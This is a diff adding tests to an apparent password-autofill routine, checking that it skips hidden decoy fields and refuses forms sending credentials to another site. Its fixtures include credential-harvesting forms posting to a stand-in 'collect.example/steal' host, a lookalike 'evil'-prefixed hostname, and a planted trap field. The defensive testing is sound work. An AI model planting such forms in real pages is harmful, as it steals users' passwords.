@@ -107,6 +107,8 @@ describe("decoys", () => {
     `<input class="d" type="password" style="opacity:0">`,
     `<input class="d" type="password" hidden>`,
     `<input class="d" type="password" aria-hidden="true">`,
+    `<div aria-hidden="true"><input class="d" type="password"></div>`,
+    `<div inert><input class="d" type="password"></div>`,
     `<input class="d" type="password" style="width:0;height:0">`,
     `<input class="d" type="password" style="position:absolute;left:-9999px">`,
     `<input class="d" type="password" disabled>`,
@@ -132,6 +134,62 @@ describe("decoys", () => {
     page(`<form><input name="u"><input type="password" style="display:none"></form>`);
     expect(fill()).toEqual({ outcome: "no-password", frame: null });
     expect(value("[name=u]")).toBe("");
+  });
+});
+
+describe("where the form sends it", () => {
+  const stays = [
+    `<form>`,
+    `<form action="">`,
+    `<form action="/session">`,
+    `<form action="https://sso.${location.hostname}/login">`,
+    `<form action="${location.origin}/login"><button formaction="/other">Go</button>`,
+  ];
+
+  it.each(stays)("fills %s", (open) => {
+    page(`${open}<input name="u"><input name="p" type="password"></form>`);
+    expect(fill()).toEqual({ outcome: "filled", usernameFilled: true });
+    expect(value("[name=p]")).toBe(creds.password);
+  });
+
+  it("refuses a form that sends to another site, and names it", () => {
+    page(`<form action="https://collect.example/steal"><input name="u"><input name="p" type="password"></form>`);
+    expect(fill()).toEqual({ outcome: "elsewhere", host: "collect.example" });
+    expect(value("[name=u]")).toBe("");
+    expect(value("[name=p]")).toBe("");
+  });
+
+  it("refuses a form whose button sends to another site", () => {
+    page(`<form><input name="u"><input name="p" type="password">
+          <button formaction="https://collect.example/steal">Sign in</button></form>`);
+    expect(fill()).toEqual({ outcome: "elsewhere", host: "collect.example" });
+    expect(value("[name=p]")).toBe("");
+  });
+
+  it("counts a script address as another site", () => {
+    page(`<form action="javascript:void(0)"><input name="p" type="password"></form>`);
+    expect(fill()).toEqual({ outcome: "elsewhere", host: "" });
+  });
+
+  it("does not take a site that merely ends the same way", () => {
+    page(`<form action="https://evil${location.hostname}/x"><input name="p" type="password"></form>`);
+    expect(fill().outcome).toBe("elsewhere");
+  });
+
+  it("fills the form that stays over a planted one marked current-password", () => {
+    page(`<form action="https://collect.example/steal"><input name="trap" type="password" autocomplete="current-password"></form>
+          <form><input name="u"><input name="real" type="password"></form>`);
+    expect(fill()).toEqual({ outcome: "filled", usernameFilled: true });
+    expect(value("[name=trap]")).toBe("");
+    expect(value("[name=real]")).toBe(creds.password);
+  });
+
+  it("only reports, without values, the same way", () => {
+    page(`<form action="https://collect.example/steal"><input name="p" type="password"></form>`);
+    expect(fillPage({ expectedOrigin: location.origin, fill: null })).toEqual({
+      outcome: "elsewhere",
+      host: "collect.example",
+    });
   });
 });
 
